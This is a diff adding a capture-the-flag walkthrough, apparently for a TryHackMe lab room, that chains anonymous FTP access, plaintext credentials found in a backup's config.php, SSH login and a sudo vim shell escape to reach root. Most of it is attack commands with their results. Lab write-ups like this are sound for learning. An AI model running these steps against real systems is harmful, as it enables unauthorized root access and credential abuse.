@@ -1,0 +1,57 @@
+----------------                               ------------------
+               :::::::::::;| H4CKED |;::::::::::::
+
+1) FIRST WE HAVE TO ACCES THE TRYHACKME FROM OPENVPN.
+2) WE HAVE TO JOIN THE ROOM "H4CKED".
+ 
+TASK - 1 (RECON)
+
+1. SCAN THE MACHNE.
+
+    namp -Pn <ip>
+    nmap -A -T 5 <ip> -vv
+
+"Found ports: 21/FTP, 22/SSH, 80/HTTP"
+"FTP allows anonymous login!"
+
+2. CHECK FTP.
+
+    ftp <ip>
+    Username: anonymous
+    Password: (press enter)
+    "Found backup.tar.gz - DOWNLOAD IT!"
+
+----------TASK 1 COMPLETED----------
+
+TASK - 2 (WEB EXPLOIT)
+
+1. EXTRACT BACKUP.
+
+    tar -xvf backup.tar.gz
+    "Got website files with config.php"
+    "DB creds: hacked:password123"
+
+2. LOGIN TO SSH.
+
+    ssh hacked@<ip>
+    Password: password123
+    "WE'RE IN!"
+
+----------TASK 2 COMPLETED-----------
+
+TASK - 3 (PRIV ESC - HACKED TO ROOT)
+
+1. CHECK SUDO.
+
+    sudo -l
+    "Can run /usr/bin/vim as root!"
+    sudo vim -c ':!/bin/sh'
+    "ROOT SHELL GET!"
+
+FLAGS:
+    cat /root/root.txt
+    cat /home/hacked/user.txt
+
+-------------------                                                --------------------
+             -----------                                    ------------
+                  ---------- H4CKED OWNED ----------
